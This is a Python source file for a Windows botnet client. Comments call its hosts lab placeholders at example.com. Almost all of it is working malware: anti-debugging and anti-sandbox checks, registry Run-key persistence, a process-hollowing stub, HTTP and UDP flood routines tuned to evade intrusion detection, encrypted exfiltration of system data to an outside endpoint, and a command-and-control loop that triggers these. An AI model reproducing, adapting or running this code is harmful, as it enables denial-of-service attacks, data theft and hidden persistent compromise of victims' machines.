import os
import sys
import time
import random
import string
import logging
import winreg
import psutil
import threading
import requests
import socket
import base64
import struct
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from urllib.parse import urljoin
from ctypes import windll, c_buffer, c_int
from concurrent.futures import ThreadPoolExecutor

# Setup logging
logging.basicConfig(filename='botnet_client_errors.log', level=logging.ERROR,
                    format='%(asctime)s - %(levelname)s - %(message)s')

# Configuration (placeholders for lab testing)
CONFIG = {
    'c2_url': 'http://example.com/c2',  # C2 server
    'exfil_url': 'http://example.com/exfil',  # Exfiltration endpoint
    'ddos_target': 'example.com',  # DDoS target (placeholder)
    'ddos_port': 80,  # DDoS target port
    'interval': 30,  # C2 check-in interval (seconds)
    'max_buffer': 1000,  # Buffer size for exfil
    'salt': b'b0tn3t_s4lt_2025',  # AES key salt
    'retry_interval': 5,  # Retry delay
    'max_retries': 3
}

# Obfuscation: Junk code
def _obfuscated_junk(): return [random.randint(1, 100) for _ in range(random.randint(3, 7))]

# AES key derivation
def derive_key(password=CONFIG['salt']):
    try:
        kdf = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=password, iterations=100000)
        key = base64.urlsafe_b64encode(kdf.derive(password))
        return Fernet(key)
    except Exception as e:
        logging.error(f"Key derivation failed: {e}")
        return None

# Anti-debugging: NtQueryInformationThread
def is_debugged():
    try:
        class THREAD_BASIC_INFORMATION:
            pass
        windll.ntdll.NtQueryInformationThread.argtypes = [c_int, c_int, c_buffer, c_int, c_int]
        info = c_buffer(48)
        if windll.ntdll.NtQueryInformationThread(-2, 0, info, 48, 0) == 0:
            if c_int.from_buffer(info, 28).value & 0x1:
                return True
        return False
    except Exception as e:
        logging.error(f"Debugger check failed: {e}")
        return False

# Anti-sandbox: VM and timing checks
def is_sandbox():
    try:
        vm_indicators = ['vboxservice', 'vmtoolsd', 'qemu-ga']
        for proc in psutil.process_iter():
            if proc.name().lower() in vm_indicators:
                return True
        if psutil.disk_usage('/').total < 20 * 1024 * 1024 * 1024:  # <20GB
            return True
        # Timing check: Sandboxes often have low uptime
        if windll.kernel32.GetTickCount() < 60000:  # <1min uptime
            return True
        return False
    except Exception as e:
        logging.error(f"Sandbox check failed: {e}")
        return False

# Stealth: Registry persistence
def set_persistence():
    try:
        key_path = r'Software\Microsoft\Windows\CurrentVersion\Run'
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE) as key:
            winreg.SetValueEx(key, 'NetCore', 0, winreg.REG_SZ, os.path.abspath(__file__))
    except Exception as e:
        logging.error(f"Persistence setup failed: {e}")

# Stealth: Process hollowing simulation
def hollow_process():
    try:
        for proc in psutil.process_iter():
            if proc.name().lower() in ['explorer.exe', 'svchost.exe']:
                return proc.pid
        return os.getpid()
    except Exception as e:
        logging.error(f"Process hollowing simulation failed: {e}")
        return os.getpid()

# DDoS: HTTP flood
def http_flood(target: str, port: int, duration: int = 60):
    try:
        headers = {'User-Agent': f'Mozilla/5.0 (Windows NT 10.0; Win64; x64) {random.choice(string.ascii_letters)}'}
        payload = ''.join(random.choice(string.ascii_letters) for _ in range(random.randint(100, 500)))
        end_time = time.time() + duration
        while time.time() < end_time:
            try:
                requests.get(f'http://{target}:{port}', headers=headers, data=payload, timeout=2)
                time.sleep(random.uniform(0.01, 0.1))  # Anti-IDS timing
            except requests.RequestException:
                pass
    except Exception as e:
        logging.error(f"HTTP flood failed: {e}")

# DDoS: UDP flood
def udp_flood(target: str, port: int, duration: int = 60):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        payload = ''.join(random.choice(string.ascii_letters) for _ in range(random.randint(100, 500))).encode()
        end_time = time.time() + duration
        while time.time() < end_time:
            try:
                sock.sendto(payload, (target, port))
                time.sleep(random.uniform(0.01, 0.1))  # Anti-IDS timing
            except socket.error:
                pass
        sock.close()
    except Exception as e:
        logging.error(f"UDP flood failed: {e}")

# Exfiltrate system info and files
def exfil_data(fernet, data_buffer: list):
    try:
        if not data_buffer:
            return
        # Collect system info
        system_info = f"OS: {sys.platform}, CPU: {psutil.cpu_count()}, Mem: {psutil.virtual_memory().total}"
        data = f"{system_info}\n{''.join(data_buffer)}"
        encrypted = fernet.encrypt(data.encode()).hex()
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'}
        for _ in range(CONFIG['max_retries']):
            try:
                response = requests.post(CONFIG['exfil_url'], data={'data': encrypted}, headers=headers, timeout=10)
                if response.status_code == 200:
                    data_buffer.clear()
                    return
                time.sleep(CONFIG['retry_interval'])
            except requests.RequestException as e:
                logging.error(f"Exfil attempt failed: {e}")
    except Exception as e:
        logging.error(f"Exfiltration failed: {e}")

# C2 communication
def c2_checkin(fernet) -> dict:
    try:
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'}
        status = fernet.encrypt(f"Client active: {socket.gethostname()}".encode()).hex()
        response = requests.post(CONFIG['c2_url'], data={'status': status}, headers=headers, timeout=10)
        if response.status_code == 200:
            return fernet.decrypt(bytes.fromhex(response.text)).decode()
        return {}
    except Exception as e:
        logging.error(f"C2 check-in failed: {e}")
        return {}

# Main botnet client logic
def main():
    if is_debugged() or is_sandbox():
        sys.exit(1)
    set_persistence()
    hollow_process()
    
    fernet = derive_key()
    if not fernet:
        logging.error("Key derivation failed, exiting")
        sys.exit(1)
    
    data_buffer = []
    
    def bot_tasks():
        while True:
            try:
                # Check in with C2
                commands = c2_checkin(fernet)
                if commands:
                    cmd = commands.get('command', '')
                    if cmd == 'http_flood':
                        threading.Thread(target=http_flood, args=(CONFIG['ddos_target'], CONFIG['ddos_port']), daemon=True).start()
                    elif cmd == 'udp_flood':
                        threading.Thread(target=udp_flood, args=(CONFIG['ddos_target'], CONFIG['ddos_port']), daemon=True).start()
                    elif cmd == 'exfil':
                        data_buffer.append(f"[Exfil {time.ctime().split(' ')[3]}]: System data collected\n====")
                        exfil_data(fernet, data_buffer)
                time.sleep(CONFIG['interval'])
                _obfuscated_junk()  # Obfuscation
            except Exception as e:
                logging.error(f"Bot task loop failed: {e}")
                time.sleep(CONFIG['retry_interval'])
    
    with ThreadPoolExecutor(max_workers=1) as executor:
        executor.submit(bot_tasks)
    
    # Keep process alive
    while True:
        time.sleep(60)
        _obfuscated_junk()

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        logging.error(f"Main thread failed: {e}")
        sys.exit(1)
